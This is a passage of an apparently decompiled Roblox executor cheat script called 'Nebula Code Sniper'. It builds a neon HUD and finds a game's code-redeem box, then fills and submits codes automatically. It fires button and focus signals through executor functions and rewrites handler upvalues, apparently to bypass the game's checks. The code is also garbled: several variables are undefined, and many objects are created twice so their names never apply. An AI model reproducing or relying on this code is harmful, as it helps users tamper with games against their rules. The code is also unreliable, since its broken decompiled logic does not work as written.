-- by LRZ
-- https://discord.gg/GW3FaBzA9F

do
    local v1 = (cloneref or function(v296)
        return v296
    end)(game:GetService("ReplicatedStorage"))
    local v2 = (cloneref or function(v296)
        return v296
    end)(game:GetService("UserInputService"))
    local v3 = (cloneref or function(v296)
        return v296
    end)(game:GetService("HttpService"))
    local v4 = (cloneref or function(v296)
        return v296
    end)(game:GetService("TweenService"))
    local v5 = (cloneref or function(v296)
        return v296
    end)(game:GetService("SoundService"))
    ;(cloneref or function(v296)
        return v296
    end)(game:GetService("CoreGui"))
    local v6 = (cloneref or function(v296)
        return v296
    end)(game:GetService("Players")).LocalPlayer:WaitForChild("PlayerGui")
    if _G.NebulaSniperCleanup then
        pcall(_G.NebulaSniperCleanup)
    end
    if (getgenv and getgenv().StopNebulaSniper) then
        pcall(getgenv().StopNebulaSniper)
    end
    local v7 = {codeSniper = true, autoSubmit = true, submitAfter = 3, retypeInvalid = false}
    pcall(function()
        if ((isfile or (syn and syn.isfile)) and (readfile or (syn and syn.readfile)) and (isfile or (syn and syn.isfile))(v379)) then
            local v121
            v121 = v3:JSONDecode(((readfile or (syn and syn.readfile))(v379)))
            if (type((v3:JSONDecode(((readfile or (syn and syn.readfile))(v379))))) == "table") then
                if (type(v121.codeSniper) == "boolean") then
                    v7.codeSniper = v121.codeSniper
                end
                if (type(v121.autoSubmit) == "boolean") then
                    v7.autoSubmit = v121.autoSubmit
                end
                if (type(v121.submitAfter) == "number") then
                    v7.submitAfter = math.max(1, math.floor(v121.submitAfter))
                end
                if (type(v121.retypeInvalid) == "boolean") then
                    v7.retypeInvalid = v121.retypeInvalid
                end
            end
        end
    end)
    local function v8()
        pcall(function()
            if writefile or (syn and syn.writefile) then
                (writefile or (syn and syn.writefile))(v379, v3:JSONEncode(v7))
            end
        end)
    end
    local v9 = v7.codeSniper
    local v10 = {}
    local v11 = v7.autoSubmit
    local v12 = v7.submitAfter
    local v13 = {}
    local v14 = {}
    local v15 = v7.retypeInvalid
    local v16 = v7.autoSubmit
    local v17, v18, v19
    local v20, v21, v22
    local v23
    local function v24(v122)
        local v123
        v123 = v122
        for v124 = 1, 10 do
            if not v123 then
                break
            end
            if (v123.Name == "NebulaCodeSniperUI") then
                return true
            end
            v123 = v123.Parent
        end
        return false
    end
    local function v25(v125)
        local v126
        v126 = v125
        while v126 do
            if (v126:IsA("GuiObject") and not v126.Visible) then
                return false
            end
            if v126:IsA("ScreenGui") then
                return v126.Enabled
            end
            v126 = v126.Parent
        end
        return true
    end
    local function v26(v127)
        local v128 = {}
        for v129, v130 in ipairs(v127:GetChildren()) do
            if (v130:IsA("ScreenGui") and v130.Enabled and not v24(v130)) then
                for v131, v132 in ipairs(v130:GetDescendants()) do
                    if (v132:IsA("TextBox") and not v24(v132)) then
                        v128[#v128 + 1] = v132
                    end
                end
            end
        end
        return v128
    end
    local function v27(v133)
        local v134
        v134 = {}
        for v135, v136 in ipairs(v133:GetChildren()) do
            if (v136:IsA("ScreenGui") and v136.Enabled and not v24(v136)) then
                for v137, v138 in ipairs(v136:GetDescendants()) do
                    if ((v138:IsA("TextButton") or v138:IsA("ImageButton")) and not v24(v138)) then
                        local v139
                        local v140
                        v139 = v138.Name:lower()
                        v140 = ((v138.Parent and v138.Parent.Name) or ""):lower()
                        if ((v139:find("code") or v139:find("redeem") or v140:find("code") or v140:find("redeem")) and v25(v138)) then
                            v134[#v134 + (1)] = v138
                        end
                    end
                end
            end
        end
        return v134
    end
    local function v28(v141)
        local v142
        local v143
        if not v141 then
            return false
        end
        v142 = {}
        v142[#v142 + 1] = function()
            v141.MouseButton1Click:Fire()
        end
        v142[#v142 + 1] = function()
            v141.Activated:Fire()
        end
        if (typeof(firesignal) == "function") then
            v142[#v142 + 1] = function()
                firesignal(v141.MouseButton1Click)
            end
            v142[#v142 + 1] = function()
                firesignal(v141.Activated)
            end
        end
        if (typeof(v380) == "function") then
            v142[#v142 + 1] = function()
                local v144
                local v145
                local v146
                local v147
                v144, v145 = pcall(v380, v141.MouseButton1Click)
                if (v144 and (type(v145) == "table")) then
                    for v148, v149 in ipairs(v145) do
                        pcall(function()
                            v149:Fire()
                        end)
                    end
                end
                v146, v147 = pcall(v380, v141.Activated)
                if (v146 and (type(v147) == "table")) then
                    for v150, v151 in ipairs(v147) do
                        pcall(function()
                            v151:Fire()
                        end)
                    end
                end
            end
        end
        if (typeof(fireclick) == "function") then
            v142[#v142 + 1] = function()
                fireclick(v141)
            end
        end
        v143 = false
        for v152, v153 in ipairs(v142) do
            local v154
            v154 = pcall(v153)
            v143 = v143 or v154
        end
        return v143
    end
    local function v29(v155)
        local v156
        if not v155 then
            return false
        end
        v156 = false
        if (typeof(firesignal) == "function") then
            local v157
            v157 = pcall(firesignal, v155.FocusLost, true)
            v156 = v156 or v157
        end
        if (typeof(v380) == "function") then
            local v158
            local v159
            v158, v159 = pcall(v380, v155.FocusLost)
            if (v158 and (type(v159) == "table")) then
                for v160, v161 in ipairs(v159) do
                    local v162
                    pcall(function()
                        v162 = v161.Function
                    end)
                    if (v162 and (typeof(v381) == "function") and (typeof(v382) == "function")) then
                        local v164
                        local v165
                        v164, v165 = pcall(v381, v162)
                        if (v164 and (type(v165) == "table")) then
                            for v166, v167 in pairs(v165) do
                                if ((type(v167) == "boolean") and (v167 == true)) then
                                    pcall(v382, v162, v166, false)
                                end
                            end
                        end
                    end
                    local v163 = pcall(function()
                        if (v161.Enabled ~= false) then
                            v161:Fire(true)
                        end
                    end)
                    v156 = v156 or v163
                end
            end
        end
        return v156
    end
    local function v30(v168)
        local v169 = v6 or v383:FindFirstChildOfClass("PlayerGui")
        if not v169 then
            return false, "No PlayerGui"
        end
        local v170 = v169:FindFirstChild("Codes")
        if v170 then
            local v177
            if v170:IsA("ScreenGui") then
                v170.Enabled = true
            end
            v177 = v170:FindFirstChild("Codes") or v170
            if v177 then
                local v178
                local v179
                local v180
                if v177:IsA("GuiObject") then
                    v177.Visible = true
                end
                v178 = v177
                while v178 and (v178 ~= v170) do
                    if v178:IsA("GuiObject") then
                        v178.Visible = true
                    end
                    v178 = v178.Parent
                end
                v179 = nil
                for v181, v182 in ipairs(v177:GetDescendants()) do
                    if (v182:IsA("TextBox") and not v24(v182)) then
                        v179 = v182
                        break
                    end
                end
                v180 = nil
                for v183, v184 in ipairs(v177:GetDescendants()) do
                    if ((v184:IsA("TextButton") or v184:IsA("ImageButton")) and not v24(v184)) then
                        local v185 = v184.Name:lower()
                        local v186 = ""
                        pcall(function()
                            v186 = v184.Text:lower()
                        end)
                        if (v185:find("submit") or v186:find("submit") or v185:find("redeem") or v186:find("redeem") or v185:find("claim") or v186:find("confirm") or v185:find("enter")) then
                            v180 = v184
                            break
                        end
                    end
                end
                if not v180 then
                    for v187, v188 in ipairs(v177:GetDescendants()) do
                        if ((v188:IsA("TextButton") or v188:IsA("ImageButton")) and not v24(v188)) then
                            local v189 = v188.Name:lower()
                            if (not v189:find("close") and not v189:find("x") and not v189:find("toggle")) then
                                v180 = v188
                                break
                            end
                        end
                    end
                end
                if v179 then
                    pcall(function()
                        v179.Text = v168
                    end)
                    task.wait(0.049999999999954525)
                    if v180 then
                        v28(v180)
                    end
                    v29(v179)
                    return true, "Submitted via PlayerGui.Codes"
                end
            end
        end
        local v171 = v27(v169)
        for v190, v191 in ipairs(v171) do
            v28(v191)
            task.wait(0.05)
        end
        task.wait(0.20000000000004547)
        local v172 = nil
        local v173 = tick() + (2)
        while tick() < v173 do
            local v192 = v26(v169)
            for v193, v194 in ipairs(v192) do
                if v25(v194) then
                    local v195 = v194.Name:lower()
                    local v196 = ((v194.Parent and v194.Parent.Name) or ""):lower()
                    if (v195:find("code") or v196:find("code") or v195:find("redeem") or v196:find("redeem") or v195:find("input") or v196:find("textbox") or v195:find("enter")) then
                        v172 = v194
                        break
                    end
                end
            end
            if not v172 then
                for v197, v198 in ipairs(v192) do
                    if v25(v198) then
                        v172 = v198
                        break
                    end
                end
            end
            if v172 then
                break
            end
            task.wait(0.1)
        end
        if not v172 then
            return false, "No code box visible"
        end
        pcall(function()
            v172.Text = v168
        end)
        task.wait(0.05)
        local v174 = nil
        local v175 = {"submit", "redeem", "claim", "confirm", "enter", "send", "apply", "ok", "use", "go", "check"}
        local v176 = v172.Parent
        for v199 = 1, 8 do
            if not v176 then
                break
            end
            for v200, v201 in ipairs(v176:GetDescendants()) do
                if ((v201:IsA("TextButton") or v201:IsA("ImageButton")) and not v24(v201) and (v201 ~= v172)) then
                    local v202 = v201.Name:lower()
                    local v203 = ""
                    pcall(function()
                        v203 = v201.Text:lower()
                    end)
                    for v204, v205 in ipairs(v175) do
                        if (v202:find(v205) or v203:find(v205)) then
                            if v25(v201) then
                                v174 = v201
                                break
                            end
                        end
                    end
                    if v174 then
                        break
                    end
                end
            end
            if v174 then
                break
            end
            v176 = v176.Parent
        end
        if v174 then
            v28(v174)
        end
        v29(v172)
        return true, "Submitted via dynamic search"
    end
    local function v31()
        local v206
        local v207
        v206 = v6
        v207 = v26(v206)
        for v208, v209 in ipairs(v207) do
            if v25(v209) then
                return v209
            end
        end
        return nil
    end
    local v32 = {Bg = Color3.fromRGB(10, 6, 20), CardBg = Color3.fromRGB(18, 12, 38), CardActiveBg = Color3.fromRGB(24, 20, 60), Control = Color3.fromRGB(36, 22, 68), ConsoleBg = Color3.fromRGB(8, 4, 16), Border = Color3.fromRGB(160, 80, 240), NeonCyan = Color3.fromRGB(0, 255, 255), NeonPurple = Color3.fromRGB(210, 110, 255), NeonPink = Color3.fromRGB(255, 90, 210), White = Color3.fromRGB(255, 255, 255), DimText = Color3.fromRGB(160, 150, 195), Green = Color3.fromRGB(60, 255, 140), Red = Color3.fromRGB(255, 75, 100)}
    local v33 = {Dim = "rgb(160,150,195)", Cyan = "rgb(0,255,255)", Green = "rgb(60,255,140)", Red = "rgb(255,75,100)", Purple = "rgb(210,110,255)"}
    local function v34(v210, v211)
        local v212
        v212 = Instance.new("UICorner")
        v212.CornerRadius = UDim.new(0, v211 or (10))
        v212.Parent = v210
        return v212
    end
    local function v35(v213, v214, v215, v216)
        local v217
        v217 = Instance.new("UIStroke")
        v217.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        v217.Color = v214 or v32.Border
        v217.Thickness = v215 or (1.4)
        v217.Transparency = v216 or (0)
        v217.Parent = v213
        return v217
    end
    local function v36(v218, v219, v220, v221, v222, v223, v224, v225)
        local v226
        v226 = Instance.new("TextLabel")
        v226.Name = v219
        v226.Size = v221
        v226.Position = v222
        v226.BackgroundTransparency = 1
        v226.Text = v220
        v226.TextSize = v223
        v226.TextColor3 = v224 or v32.White
        v226.Font = v225 or Enum.Font.GothamBold
        v226.TextXAlignment = Enum.TextXAlignment.Left
        v226.TextYAlignment = Enum.TextYAlignment.Center
        v226.ZIndex = 8
        v226.Parent = v218
        return v226
    end
    pcall(function()
        local v227
        local v228
        v227 = game.CoreGui:FindFirstChild("NebulaCodeSniperUI")
        if (game.CoreGui:FindFirstChild("NebulaCodeSniperUI")) then
            v227:Destroy()
        end
        v228 = v6:FindFirstChild("NebulaCodeSniperUI")
        if (v6:FindFirstChild("NebulaCodeSniperUI")) then
            v228:Destroy()
        end
    end)
    local v37 = Instance.new("ScreenGui")
    Instance.new("ScreenGui").Name = "NebulaCodeSniperUI"
    v37.ResetOnSpawn = false
    v37.IgnoreGuiInset = true
    v37.DisplayOrder = 999
    if not pcall(function()
        v37.Parent = game.CoreGui
    end) then
        v37.Parent = ((cloneref or function(v296)
            return v296
        end)(game:GetService("Players")).LocalPlayer:WaitForChild("PlayerGui"))
    end
    local v38 = Instance.new("Frame")
    Instance.new("Frame").Name = "Window"
    v38.Size = UDim2.fromOffset(320, 380)
    v38.AnchorPoint = Vector2.new(1, 0)
    v38.Position = UDim2.new(1, -12, 0, 12)
    v38.BackgroundColor3 = v32.Bg
    v38.BorderSizePixel = 0
    v38.ClipsDescendants = false
    v38.Parent = v37
    v34(v38, 18)
    local v39 = v35(v38, v32.NeonCyan, 1.7999999999999545, 0)
    local v40 = Instance.new("UIGradient", v39)
    Instance.new("UIGradient", v39).Color = ColorSequence.new({ColorSequenceKeypoint.new(0, v32.NeonCyan), ColorSequenceKeypoint.new(0.5, v32.NeonPurple), ColorSequenceKeypoint.new(1, v32.NeonPink)})
    local v41 = Instance.new("Frame")
    Instance.new("Frame").Name = "FXContainer"
    v41.Size = UDim2.fromScale(1, 1)
    v41.BackgroundTransparency = 1
    v41.ClipsDescendants = false
    v41.ZIndex = 2
    v41.Parent = v38
    local v42 = Instance.new("Frame", v41)
    Instance.new("Frame", v41).Name = "BottomJetOuter"
    v42.Size = UDim2.new(0, 0, 0, 0)
    v42.Position = UDim2.new(0.5, 0, 1, 0)
    v42.BackgroundColor3 = Color3.fromRGB(255, 60, 10)
    v42.BorderSizePixel = 0
    v42.ZIndex = 2
    v34(v42, 16)
    local v43 = Instance.new("UIGradient", v42)
    Instance.new("UIGradient", v42).Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 230, 80)), ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 60, 20)), ColorSequenceKeypoint.new(0.8, Color3.fromRGB(180, 20, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 0, 30))})
    local v44 = Instance.new("Frame", v42)
    Instance.new("Frame", v42).Name = "Core"
    v44.Size = UDim2.new(0.5, 0, 0.7, 0)
    v44.Position = UDim2.new(0.25, 0, 0, 0)
    v44.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    v44.BorderSizePixel = 0
    v44.ZIndex = 3
    v34(v44, 10)
    local v45 = Instance.new("UIGradient", v44)
    Instance.new("UIGradient", v44).Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 240, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 120, 0))})
    local v46 = Instance.new("Frame", v41)
    Instance.new("Frame", v41).Name = "TopJetOuter"
    v46.Size = UDim2.new(0, 0, 0, 0)
    v46.Position = UDim2.new(0.5, 0, 0, 0)
    v46.BackgroundColor3 = Color3.fromRGB(255, 60, 10)
    v46.BorderSizePixel = 0
    v46.ZIndex = 2
    v34(v46, 16)
    local v47 = Instance.new("UIGradient", v46)
    Instance.new("UIGradient", v46).Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(10, 0, 30)), ColorSequenceKeypoint.new(0.2, Color3.fromRGB(180, 20, 255)), ColorSequenceKeypoint.new(0.6, Color3.fromRGB(255, 60, 20)), ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 230, 80))})
    local v48 = Instance.new("Frame", v46)
    Instance.new("Frame", v46).Name = "Core"
    v48.Size = UDim2.new(0.5, 0, 0.7, 0)
    v48.Position = UDim2.new(0.25, 0, 0.3, 0)
    v48.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    v48.BorderSizePixel = 0
    v48.ZIndex = 3
    v34(v48, 10)
    local v49 = Instance.new("UIGradient", v48)
    Instance.new("UIGradient", v48).Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 120, 0)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 240, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))})
    local v50 = {}
    for v230 = 1, 8 do
        local v231
        v231 = Instance.new("Frame", v41)
        Instance.new("Frame", v41).Name = "WindStreak_" .. v230
        v231.Size = UDim2.fromOffset(0, 0)
        v231.BackgroundColor3 = (v230 <= 4 and v32.NeonCyan) or v32.NeonPurple
        v231.BorderSizePixel = 0
        v231.ZIndex = 3
        v34(v231, 2)
        v384 = Instance.new("UIGradient", v231)
        Instance.new("UIGradient", v231).Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.5, (v230 <= 4 and v32.NeonCyan) or v32.NeonPurple), ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0))})
        v384.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 0.09999999999990905), NumberSequenceKeypoint.new(1, 1)})
        table.insert(v50, {frame = v231, isLeft = v230 <= 4, xOffset = (v230 <= 4 and (-4 - (v230 * 3))) or (320 + ((v230 - (4)) * (3))), yBase = (40) + (v230 * 35)})
    end
    local v51 = {}
    for v232 = 1, 20 do
        local v233
        v233 = Instance.new("Frame", v41)
        Instance.new("Frame", v41).Name = "PlasmaSpark"
        v233.Size = UDim2.fromOffset(4, 4)
        v233.BackgroundColor3 = (((v232 % 2) == (0)) and Color3.fromRGB(255, 220, 50)) or Color3.fromRGB(255, 80, 20)
        v233.BorderSizePixel = 0
        v233.Visible = false
        v233.ZIndex = 4
        v34(v233, 2)
        table.insert(v51, {obj = v233, active = false, vx = 0, vy = 0, life = 0, maxLife = 0.3})
    end
    local function v52(v234, v235)
        for v236, v237 in ipairs(v51) do
            if (not v237.active and (math.random(1, 3) == (1))) then
                v237.active = true
                v237.life = 0
                v237.maxLife = math.random(20, 35) / (100)
                local v238 = (160) + math.random(-45, 45)
                local v239 = (v234 and (375)) or 5
                v237.obj.Position = UDim2.fromOffset(v238, v239)
                v237.obj.Size = UDim2.fromOffset(math.random(3, 6), math.random(3, 6))
                v237.obj.Visible = true
                v237.vx = math.random(-80, 80)
                v237.vy = (v234 and math.random(140, 320)) or math.random(-320, -140)
            end
        end
    end
    local v53 = Instance.new("Frame")
    Instance.new("Frame").Name = "DeepSpaceLayer"
    v53.Size = UDim2.fromScale(1, 1)
    v53.BackgroundColor3 = Color3.fromRGB(12, 8, 26)
    v53.BorderSizePixel = 0
    v53.ClipsDescendants = true
    v53.ZIndex = 1
    v53.Parent = v38
    v34(v53, 18)
    local v54 = Instance.new("UIGradient", v53)
    Instance.new("UIGradient", v53).Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(32, 12, 68)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(14, 6, 32)), ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 3, 16))})
    local v55 = Instance.new("ImageLabel")
    Instance.new("ImageLabel").Name = "NebulaCloud1"
    v55.Size = UDim2.fromScale(1.4, 1.4)
    v55.Position = UDim2.fromScale(-0.20000000000004547, -0.2)
    local v56 = Instance.new("Frame")
    Instance.new("Frame").Name = "StarDustContainer"
    v56.Size = UDim2.fromScale(1, 1)
    v56.BackgroundTransparency = 1
    v56.ClipsDescendants = true
    v56.ZIndex = 3
    v56.Parent = v53
    local v57 = {}
    for v240 = 1, 38 do
        local v241 = Instance.new("Frame")
        Instance.new("Frame").Name = "StarDot"
        v241.Size = UDim2.fromOffset((((v240 % (6)) == (0)) and 6) or (((v240 % (3)) == 0) and (4)) or (3), (((v240 % (6)) == (0)) and 6) or (((v240 % (3)) == 0) and (4)) or (3))
        v241.Position = UDim2.fromScale(math.random(), math.random())
        local v242 = (((v240 % (3)) == 0) and v32.NeonCyan) or (((v240 % (3)) == 1) and v32.NeonPink) or v32.White
        v241.BackgroundColor3 = v242
        v241.BackgroundTransparency = (((v240 % 4) == 0) and (0)) or (math.random(5, 25) / (100))
        v241.BorderSizePixel = 0
        v241.ZIndex = 3
        v241.Parent = v56
        v34(v241, (((v240 % (6)) == (0)) and 6) or (((v240 % (3)) == 0) and (4)) or (3))
        if (((((v240 % (6)) == (0)) and 6) or (((v240 % (3)) == 0) and (4)) or (3)) >= 4) then
            v385 = Instance.new("UIStroke", v241)
            Instance.new("UIStroke", v241).Color = v242
        end
        table.insert(v57, {obj = v241, speed = math.random(10, 26) / (1000), sway = math.random(-8, 8) / (1000), baseX = v241.Position.X.Scale})
    end
    local v58 = (cloneref or function(v296)
        return v296
    end)(game:GetService("RunService")).RenderStepped:Connect(function(v244)
        for v245, v246 in ipairs(v57) do
            local v247
            local v248
            v247 = v246.obj.Position.Y.Scale
            v248 = v247 - (v246.speed * v244)
            if (v248 < -0.05) then
                v246.baseX = math.random()
                v246.obj.Position = UDim2.fromScale(v246.baseX, 1.05)
            else
                local v249
                v249 = v246.baseX + (math.sin((tick() * (2)) + (v246.speed * (100))) * (0.02))
                v246.obj.Position = UDim2.fromScale(v249, v248)
            end
        end
        for v250, v251 in ipairs(v51) do
            if v251.active then
                v251.life = v251.life + v244
                if (v251.life >= v251.maxLife) then
                    v251.active = false
                    v251.obj.Visible = false
                else
                    local v252
                    local v253
                    v252 = v251.life / v251.maxLife
                    v253 = v251.obj.Position
                    v251.obj.Position = UDim2.fromOffset(v253.X.Offset + (v251.vx * v244), v253.Y.Offset + (v251.vy * v244))
                    v251.obj.BackgroundTransparency = v252
                end
            end
        end
    end)
    local v59 = Instance.new("UIScale")
    Instance.new("UIScale").Name = "InterfaceScale"
    local function v60()
        local v254 = workspace.CurrentCamera
        if not v254 then
            return
        end
        local v255 = v254.ViewportSize
        local v256 = math.min((v255.X - (20)) / 320, (v255.Y - (20)) / (380))
        if v2.TouchEnabled then
            v59.Scale = math.max(0.48, math.min(0.78, v256))
        end
    end
    workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(v60)
    v60()
    local v61 = Instance.new("Frame")
    Instance.new("Frame").Name = "Header"
    v61.Size = UDim2.new(1, 0, 0, 64)
    v61.BackgroundTransparency = 1
    v61.Active = true
    v61.ZIndex = 5
    v61.Parent = v38
    local v62 = Instance.new("Frame")
    Instance.new("Frame").Name = "CustomNebulaPlanet"
    v62.Size = UDim2.fromOffset(36, 36)
    v62.Position = UDim2.fromOffset(14, 14)
    v62.BackgroundColor3 = Color3.fromRGB(35, 18, 68)
    v62.BackgroundTransparency = 0.15
    v62.BorderSizePixel = 0
    v62.ClipsDescendants = false
    v62.ZIndex = 6
    v62.Parent = v61
    v34(v62, 10)
    v35(v62, v32.NeonCyan, 1.3999999999999773, 0.20000000000004547)
    local v63 = Instance.new("Frame")
    Instance.new("Frame").Name = "OrbitRing"
    v63.Size = UDim2.fromOffset(34, 11)
    v63.Position = UDim2.new(0.5, -17, 0.5, -5.5)
    v63.BackgroundTransparency = 1
    v63.Rotation = -28
    v63.ZIndex = 8
    v63.Parent = v62
    v34(v63, 6)
    local v64 = v35(v63, v32.NeonCyan, 1.6000000000000227, 0)
    Instance.new("UIGradient", v64).Color = ColorSequence.new({ColorSequenceKeypoint.new(0, v32.NeonCyan), ColorSequenceKeypoint.new(0.5, v32.NeonPurple), ColorSequenceKeypoint.new(1, v32.NeonPink)})
    local v65 = Instance.new("Frame")
    Instance.new("Frame").Name = "PlanetSphere"
    v65.Size = UDim2.fromOffset(18, 18)
    v65.Position = UDim2.new(0.5, -9, 0.5, -9)
    v65.BackgroundColor3 = Color3.fromRGB(0, 245, 255)
    v65.BorderSizePixel = 0
    v65.ZIndex = 7
    v65.Parent = v62
    v34(v65, 9)
    local v66 = Instance.new("UIGradient", v65)
    Instance.new("UIGradient", v65).Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 255)), ColorSequenceKeypoint.new(0.45, Color3.fromRGB(175, 80, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(50, 15, 90))})
    local v67 = Instance.new("Frame")
    Instance.new("Frame").Name = "Glare"
    v67.Size = UDim2.fromOffset(5, 5)
    v67.Position = UDim2.fromOffset(3, 3)
    v67.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    v67.BackgroundTransparency = 0.2
    v67.BorderSizePixel = 0
    v67.ZIndex = 9
    v67.Parent = v65
    v34(v67, 3)
    local v68 = v36(v61, "Title", '<font color="#00ffff">NEBULA</font> HUB', UDim2.fromOffset(165, 22), UDim2.fromOffset(58, 13), 16.5, v32.White, Enum.Font.GothamBlack)
    local v69 = v36(v61, "SubTitle", "NEBULA CODE SNIPER", UDim2.fromOffset(165, 16), UDim2.fromOffset(58, 35), 9.5, v32.DimText, Enum.Font.GothamBold)
    local v70 = Instance.new("TextButton")
    Instance.new("TextButton").Name = "MasterToggle"
    v70.Size = UDim2.fromOffset(48, 24)
    v70.Position = UDim2.new(1, -62, 0, 20)
    v70.BackgroundColor3 = (v9 and v32.NeonCyan) or v32.Control
    v70.BorderSizePixel = 0
    v70.AutoButtonColor = false
    v70.Active = true
    v70.Text = ""
    v70.ZIndex = 8
    v70.Parent = v61
    v34(v70, 12)
    local v71 = v35(v70, v32.White, 1.2000000000000002, (v9 and 0.1) or (0.7))
    local v72 = Instance.new("Frame")
    Instance.new("Frame").Name = "Knob"
    v72.Size = UDim2.fromOffset(20, 20)
    v72.Position = (v9 and UDim2.new(1, -22, 0.5, -10)) or UDim2.new(0, 2, 0.5, -10)
    v72.BackgroundColor3 = (v9 and v32.Bg) or v32.White
    v72.BorderSizePixel = 0
    v72.ZIndex = 9
    v72.Parent = v70
    v34(v72, 10)
    local v73 = Instance.new("Frame")
    Instance.new("Frame").Name = "Divider"
    v73.Size = UDim2.new(1, -28, 0, 1)
    v73.Position = UDim2.fromOffset(14, 60)
    local v74, v75, v76
    local function v77()
        task.defer(function()
            local v257
            task.wait()
            if v76 then
                v76()
            end
            v257 = math.max(0, v74.AbsoluteCanvasSize.Y - v74.AbsoluteWindowSize.Y)
            v74.CanvasPosition = Vector2.new(0, v257)
        end)
    end
    local function v78(v258, v259)
        local v260
        local v261
        local v262
        if (not v75 or v16) then
            return
        end
        v260 = (v259 and "ON") or "OFF"
        v261 = (v259 and v33.Green) or v33.Red
        v262 = '<font color="' .. v33.Dim .. '">[setting]</font> ' .. '<font color="' .. v33.Cyan .. '">' .. v258 .. "</font> " .. '<font color="' .. v33.Dim .. '">-&gt;</font> ' .. '<font color="' .. v261 .. '">' .. v260 .. "</font>"
        if (v75.Text == "") then
            v75.Text = v262
        else
            v75.Text = v75.Text .. "\n" .. v262
        end
        v77()
    end
    local function v79()
        if ((tick() - v386) < 0.15) then
            return
        end
        v386 = tick()
        v9 = not v9
        v7.codeSniper = v9
        if (not v9 and v23) then
            v23()
        end
        v8()
        v387 = nil
        v4:Create(v70, TweenInfo.new(0.2), {BackgroundColor3 = (v9 and v32.NeonCyan) or v32.Control}):Play()
        v72.BackgroundColor3 = (v9 and v32.Bg) or v32.White
        v4:Create(v72, TweenInfo.new(0.20000000000004547, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = (v9 and UDim2.new(1, -22, 0.5, -10)) or UDim2.new(0, 2, 0.5, -10)}):Play()
        if (v75 and not v16) then
            if v9 then
                v75.Text = '<font color="' .. v33.Cyan .. '">&gt; Nebula Sniper active. Scanning nebula for codes...</font>'
            else
                v75.Text = '<font color="' .. v33.Dim .. '">status:</font> <font color="' .. v33.Red .. '">OFF</font>\n<font color="' .. v33.Dim .. '">Code sniper paused.</font>'
            end
            v77()
        end
    end
    v70.Activated:Connect(v79)
    v70.MouseButton1Click:Connect(v79)
    local v80 = Instance.new("Frame")
    Instance.new("Frame").Name = "Settings"
    v80.Size = UDim2.new(1, 0, 0, 160)
    v80.Position = UDim2.fromOffset(0, 68)
    v80.BackgroundTransparency = 1
    v80.ZIndex = 5
    v80.Parent = v38
    local function v81(v263, v264, v265)
        local v266
        local v267
        v266 = Instance.new("Frame")
        v266.Name = v263
        v266.Position = v264
        v266.Size = v265
        v266.BackgroundColor3 = v32.CardBg
        v266.BorderSizePixel = 0
        v266.ZIndex = 5
        v266.Parent = v80
        v34(v266, 11)
        v267 = v35(v266, v32.Border, 1.2000000000000455, 0.45)
        return v266, v267
    end
    local function v82(v268, v269, v270, v271)
        if v271 then
            if v269 then
                v269.Color = v32.NeonCyan
                v269.Thickness = 1.6000000000000227
                v269.Transparency = 0
            end
            if v268 then
                v4:Create(v268, TweenInfo.new(0.2), {BackgroundColor3 = v32.CardActiveBg}):Play()
            end
            if v270 then
                v270.TextColor3 = v32.NeonCyan
            end
        else
            if v269 then
                v269.Color = v32.Border
                v269.Thickness = 1.2
                v269.Transparency = 0.5
            end
            if v268 then
                v4:Create(v268, TweenInfo.new(0.2), {BackgroundColor3 = v32.CardBg}):Play()
            end
            if v270 then
                v270.TextColor3 = v32.White
            end
        end
    end
    local function v83(v272, v273, v274, v275, v276, v277, v278)
        local v279
        local v280
        local v281
        local v282
        v272.Active = true
        v279 = Instance.new("TextButton")
        v279.Name = "State"
        v279.Size = UDim2.fromOffset(46, 22)
        v279.Position = UDim2.new(1, -54, 0.5, -11)
        v279.BackgroundColor3 = (v273 and v32.NeonCyan) or v32.Control
        v279.BorderSizePixel = 0
        v279.AutoButtonColor = false
        v279.Active = true
        v279.Text = (v273 and "ON") or "OFF"
        v279.TextSize = 10
        v279.TextColor3 = (v273 and v32.Bg) or v32.DimText
        v279.Font = Enum.Font.GothamBlack
        v279.ZIndex = 8
        v279.Parent = v272
        v34(v279, 6)
        v388 = v35(v279, v32.White, 1, (v273 and (0.1)) or (0.7000000000000455))
        v82(v275, v276, v277, v273)
        v280 = v273
        v281 = 0
        v282 = nil
        function v282()
            if ((tick() - v281) < (0.15)) then
                return
            end
            v281 = tick()
            v280 = not v280
            v279.Text = (v280 and "ON") or "OFF"
            v279.BackgroundColor3 = (v280 and v32.NeonCyan) or v32.Control
            v279.TextColor3 = (v280 and v32.Bg) or v32.DimText
            v82(v275, v276, v277, v280)
            if (v9 and not v16) then
                v78(v274, v280)
            end
            if v278 then
                v278(v280)
            end
        end
        v279.Activated:Connect(v282)
        v279.MouseButton1Click:Connect(v282)
        return v279
    end
    local v84, v85 = v81("AutoSubmit", UDim2.fromOffset(14, 0), UDim2.new(1, -28, 0, 42))
    local v86 = v36(v84, "Title", "Auto Submit Code", UDim2.new(1, -70, 1, 0), UDim2.fromOffset(12, 0), 12, v32.White, Enum.Font.GothamBold)
